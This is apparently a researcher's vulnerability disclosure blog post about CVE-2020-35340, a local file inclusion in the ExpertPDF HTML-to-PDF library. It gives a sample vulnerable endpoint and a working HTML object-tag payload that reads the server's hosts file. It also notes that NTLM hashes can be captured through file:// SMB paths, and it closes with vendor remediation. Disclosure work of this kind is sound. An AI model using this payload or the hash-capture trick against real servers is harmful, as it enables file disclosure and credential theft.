## I hack things and occasionally write about it

 Written by [optional](https://optionalctf.com/author/rootoptional/)[September 14, 2021September 14, 2021](https://optionalctf.com/cve-2020-35340-local-file-inclusion-in-expertpdf-9-5-0-14-1-0/)
# CVE-2020-35340 – Local File Inclusion in ExpertPDF 9.5.0 – 14.1.0

Affected Vendor: [expertpdf.net](https://www.expertpdf.net/) || [nuget.org/packages/ExpertPdfHtmlToPdf/](https://www.nuget.org/packages/ExpertPdfHtmlToPdf/)

Affected Versions: 9.5.0 – 14.1.0

## Context

ExpertPDF is a .NET library that has been downloaded over 300,000 times. The core functionality of this library is to allow conversion of HTML to PDF whether from raw HTML or from a file.

Now a question for you…

Q: What happens when we allow user-controlled input to be passed to the conversion function?

A: Initially it presented itself as HTML injection within the generated PDF, this initially lead to many hours diving down rabbit hole after rabbit hole, attempting to find a vector to exploit this.

It then dawned on me that you can potentially pull files into the page, initially I was trying to get a hit on a Responder client but later realised that by specifying a local file it would in fact pull it into the page if that file is readable!

## Replication

Now you may be wondering how to replicate this wonderful thing? Well here’s how

1. Set up a basic .NET webapp that imports a vulnerable version of the expertPDF library.
2. Ensure the application runs and add the following code

```
 [HttpGet()]
        public FileContentResult GetPDF()
        {
            var pdfConverter = new PdfConverter();

            pdfConverter.PdfDocumentOptions.PdfPageSize = PdfPageSize.A4;
            pdfConverter.PdfDocumentOptions.PdfCompressionLevel = PdfCompressionLevel.Normal;
            pdfConverter.PdfDocumentOptions.ShowHeader = true;
            pdfConverter.PdfDocumentOptions.ShowFooter = true;
            pdfConverter.PdfDocumentOptions.LeftMargin = 5;
            pdfConverter.PdfDocumentOptions.RightMargin = 5;
            pdfConverter.PdfDocumentOptions.TopMargin = 5;
            pdfConverter.PdfDocumentOptions.BottomMargin = 5;
            pdfConverter.PdfDocumentOptions.GenerateSelectablePdf = true;

            pdfConverter.PdfDocumentOptions.ShowHeader = false;

            pdfConverter.PdfFooterOptions.FooterText = "Sample footer";
            pdfConverter.PdfFooterOptions.FooterTextColor = Color.Blue;
            pdfConverter.PdfFooterOptions.DrawFooterLine = false;
            pdfConverter.PdfFooterOptions.PageNumberText = "Page";
            pdfConverter.PdfFooterOptions.ShowPageNumber = true;

            var download = pdfConverter.GetPdfBytesFromHtmlString("<MALICIOUS HTML HERE>");
            return new FileContentResult(download, "application/pdf");
        }
```

3. As you can see above there is a snip within the `GetPdfBytesFromHtmlString`, this is where the following payload will go

`<object width=600 height=1000 data='C:/windows/system32/drivers/etc/hosts' type='text/plain'></object>`

4. Now when you hit the endpoint you have this running on, you’ll receive the hosts file from the server.

**ADDITIONAL:** Upon further testing, it was identified that you could pull NTLM hashes from the server by specifying `file://` abusing the nature of SMB. You’re also able to hit responder and obtain the hash of the account running the web server.

## Remediation

After several emails with the vendor, they had implemented a patch that is effective in version 15.0.0 and later.

By setting the following `AllowLocalAccess` property to false, it will prevent access to the file system.
– [html-to-pdf.net documentation](https://www.html-to-pdf.net/html-to-pdf-library/html/P_ExpertPdf_HtmlToPdf_PdfConverter_AllowLocalAccess.htm)

**IMPORTANT****:** It is key to note that by default the AllowLocalAccess is property will be set to True. Allowing access to the file system!

## Closing Words

Thank you to Westar ([twitter.com/WesVleuten](https://twitter.com/WesVleuten)) for the creation of the testing environment to verify this vulnerability alongside helping test different versions to determine the scale of the vulnerability.
